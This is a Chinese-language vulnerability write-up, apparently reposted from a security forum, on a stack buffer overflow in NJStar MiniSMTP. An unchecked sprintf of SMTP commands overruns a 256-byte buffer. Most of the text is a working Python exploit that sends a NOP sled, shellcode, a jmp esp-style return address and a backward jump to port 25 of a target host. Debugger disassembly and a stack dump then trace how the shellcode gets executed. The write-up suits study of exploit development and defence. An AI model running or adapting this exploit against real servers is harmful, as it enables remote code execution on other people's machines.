
# 简单分析南极星 MiniSMTP 缓冲区溢出漏洞

> 原文：[`www.pediy.com/kssd/pediy12/142656.html`](https://www.pediy.com/kssd/pediy12/142656.html)

软件下载地址：http://www.skycn.com/soft/3068.html

`MiniSMTP`，位于 `Njstar Communicator` 安装目录下。当 `MiniSMTP` 收到 `SMTP` 命令时，使用 `sprintf(buff,"Command: %s",strCmd)` 格式化命令，并显示在 UI 界面。`buff` 是 256 字节固定长度，程序中没有对 `strCmd` 的长度做检测。当 `strCmd` 的长度大于 247 时，缓冲区溢出，并覆盖函数返回地址。可使用 `jmp esp`, `或 push esp` , `retn` 等跳板指令可以执行 shellcode。

## exploit python 代码

```python
import socket

HOST = '10.200.97.18'    # The remote host
PORT = 25              # The same port as used by the server

#简单的 shellcode，程序安静的退出. xp sp2 适用
sh_exitprocess="\\x6a\\01"+\
                "\\xb8\\x12\\xcb\\x81\\x7c"+\
                "\\xff\\xd0"

#nop + shellcode + ret_addr + 向后跳转 jmp 指令 + "\\r\\n". 程序以\\r\\n 作为 SMTP 命令的结束，添加\\r\\n 让程序尽快的触发。
evildata='\\x90'*(247-len(sh_exitprocess))+sh_exitprocess+'\\x59\\x54\\xc3\\x77'+'\\xe9\\x09\\xff\\xff\\xff'+"\\r\\n"

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    data = s.recv(1024)
    print data
    s.send(evildata)
    data = s.recv(1024)
    print data
    s.close()
    print 'end'
```

## 调试代码

### 关键函数入口

```
004052D0   .  81EC 08030000  sub     esp, 308                                   ;  Session thread
004052D6   .  53            push    ebx
004052D7   .  55            push    ebp
004052D8   .  56            push    esi
004052D9   .  8BF1          mov     esi, ecx
004052DB   .  57            push    edi
004052DC   .  6A 00         push    0
```
`sub esp, 308` 分配临时空间

### sprintf 漏洞点

```
0040533C   .  55            push    ebp
0040533D   .  8D9424 1C0200>lea     edx, dword ptr [esp+21C]
00405344   .  68 DC494100   push    004149DC                                   ;  ASCII "Command: %s"
00405349   .  52            push    edx
0040534A   .  FFD3          call    ebx                                        ;  call sprintf 漏洞点
```
`edx` 是长度为 256 字节的栈空间

### 函数结束，清理临时空间

```
00405651   > \5F            pop     edi
00405652   .  5E            pop     esi
00405653   .  5D            pop     ebp
00405654   .  5B            pop     ebx
00405655   .  81C4 08030000 add     esp, 308
0040565B   .  C3            retn
```

此时的栈结构如下：

```
00F1FF44   90909090
00F1FF48   90909090
00F1FF4C   90909090
00F1FF50   90909090
00F1FF54   90909090
00F1FF58   90909090
00F1FF5C   90909090
00F1FF60   6A909090
00F1FF64   CB12B801
00F1FF68   D0FF7C81
00F1FF6C   77C35459  msvcrt.77C35459
00F1FF70   FFFF09E9
00F1FF74   000000FF
00F1FF78   00A03CF8
00F1FF7C   00A03CF8
```
`esp` 指向 `00F1FF6C 77C35459 msvcrt.77C35459`。 程序将跳转到 `77C35459` 处执行 `push esp`，`retn`。此时 `esp` 指向的代码是 `E9 09FFFFFF`，是一个 `jmp` 指令跳至-247 处，执行一串 `nop` 指令。

最终执行到 `shellcode`。
